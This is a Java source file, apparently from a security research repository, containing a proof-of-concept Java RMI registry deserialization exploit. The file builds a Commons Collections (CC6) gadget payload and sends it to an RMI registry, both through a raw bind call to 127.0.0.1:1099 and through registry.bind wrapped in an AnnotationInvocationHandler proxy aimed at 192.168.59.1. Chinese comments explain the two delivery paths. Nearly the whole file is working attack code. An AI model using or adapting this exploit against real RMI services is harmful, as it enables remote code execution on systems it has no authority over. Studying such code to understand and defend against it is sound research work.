package com.dem0.vuln;

import com.dem0.internal.ReflectUtils;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.util.HashMap;
import java.util.Map;

import static com.dem0.rmi.Main.sendRawCall;

public class AttackBind {
    public static void main(String[] args) throws Exception {
        try {
            ReflectUtils.enableCustomRMIClassLoader();
            Object payloadObj = new CC6().getPayload();

            ObjID objID_ = new ObjID(0);

            //sendRawCall和之前一致 构造bind(obj,null)包
            sendRawCall("127.0.0.1",1099,objID_,0,4905912898345647071L,"Test",payloadObj);
        }catch (Throwable t){
            t.printStackTrace();
        }

        Object payload = new CC6().getPayload();
        Registry registry = LocateRegistry.getRegistry("192.168.59.1", 1099);
        Map<String, Object> map = new HashMap<>();
        map.put("whatever", payload);
        Constructor constructor =  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler  = (InvocationHandler) constructor.newInstance(Override.class, map);
        Remote obj = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);
        registry.bind("evil", obj);//和上面的相同，这里只是进行包装了一下
    }
}
